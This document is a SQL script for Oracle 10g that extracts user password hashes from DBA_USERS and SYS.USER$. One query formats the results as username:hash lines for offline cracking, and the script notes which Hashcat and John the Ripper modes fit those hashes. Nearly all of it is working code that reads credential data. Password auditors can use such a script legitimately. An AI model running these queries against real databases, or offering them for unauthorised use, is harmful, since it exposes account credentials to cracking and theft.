-- =============================================================================
-- Oracle 10g Password Hash Extraction Script
-- =============================================================================
-- In Oracle 10g, passwords are stored as a DES-based hash in the PASSWORD
-- column of SYS.USER$ (and exposed via DBA_USERS).
-- The hash is a 16-character uppercase hexadecimal string derived from a
-- case-insensitive DES hash of UPPER(username) || UPPER(password).
--
-- Required privilege: SELECT on SYS.USER$ or SELECT ANY DICTIONARY / DBA role
-- =============================================================================

-- ---------------------------------------------------------------------------
-- 1. Extract all non-system user password hashes from DBA_USERS
--    (available in 10g; the PASSWORD column was removed/nulled in 11g+)
-- ---------------------------------------------------------------------------
SELECT
    username,
    password          AS password_hash_10g,
    account_status,
    created,
    expiry_date,
    default_tablespace,
    profile
FROM
    dba_users
WHERE
    username NOT IN (
        'SYS','SYSTEM','DBSNMP','SYSMAN','OUTLN','MDSYS','ORDSYS',
        'EXFSYS','DMSYS','WMSYS','CTXSYS','ANONYMOUS','XDB','ORDPLUGINS',
        'SI_INFORMTN_SCHEMA','OWF_MGR','SCOTT','HR','OE','SH','PM',
        'BI','IX'
    )
ORDER BY
    username;


-- ---------------------------------------------------------------------------
-- 2. Extract password hashes directly from SYS.USER$ (more complete view)
--    The PASSWORD column in USER$ holds the raw 10g DES hash.
-- ---------------------------------------------------------------------------
SELECT
    u.name            AS username,
    u.password        AS password_hash_10g,
    u.astatus         AS account_status_code,
    DECODE(u.astatus,
        0,  'OPEN',
        4,  'EXPIRED',
        8,  'LOCKED',
        16, 'EXPIRED & LOCKED',
        'OTHER'
    )                 AS account_status,
    u.ctime           AS created,
    u.ptime           AS password_change_time,
    u.exptime         AS expiry_time,
    u.ltime           AS lock_time
FROM
    sys.user$  u
WHERE
    u.type# = 1          -- 1 = normal user (not role, not pseudo-user)
    AND u.name NOT IN (
        'SYS','SYSTEM','DBSNMP','OUTLN','ANONYMOUS','PUBLIC'
    )
ORDER BY
    u.name;


-- ---------------------------------------------------------------------------
-- 3. Extract a specific user's password hash
--    Replace :target_user with the username (stored in uppercase in Oracle).
-- ---------------------------------------------------------------------------
SELECT
    name        AS username,
    password    AS password_hash_10g
FROM
    sys.user$
WHERE
    name = UPPER('&target_user');


-- ---------------------------------------------------------------------------
-- 4. Format output ready for offline cracking tools (e.g. John the Ripper,
--    Hashcat mode 3100: oracle-h – username:hash)
--    Run this as a script and spool the output to a file.
-- ---------------------------------------------------------------------------
SELECT
    name || ':' || password  AS crack_format
FROM
    sys.user$
WHERE
    type# = 1
    AND password IS NOT NULL
    AND password != 'EXTERNAL'
ORDER BY
    name;


-- ---------------------------------------------------------------------------
-- Notes
-- ---------------------------------------------------------------------------
-- * Oracle 10g hash algorithm: DES, key = UPPER(username)||UPPER(password)
--   The hash is case-insensitive; uppercase and lowercase passwords produce
--   the same hash in 10g.
-- * The 16-character hex hash is stored in SYS.USER$.PASSWORD.
-- * In Oracle 10g the DBA_USERS.PASSWORD column is populated; in 11g+ it
--   is set to NULL for security reasons (use the 11g script instead).
-- * Hashcat mode: -m 3100  (Oracle H: Des(Oracle))
-- * John the Ripper format: --format=oracle (for 10g DES hashes)
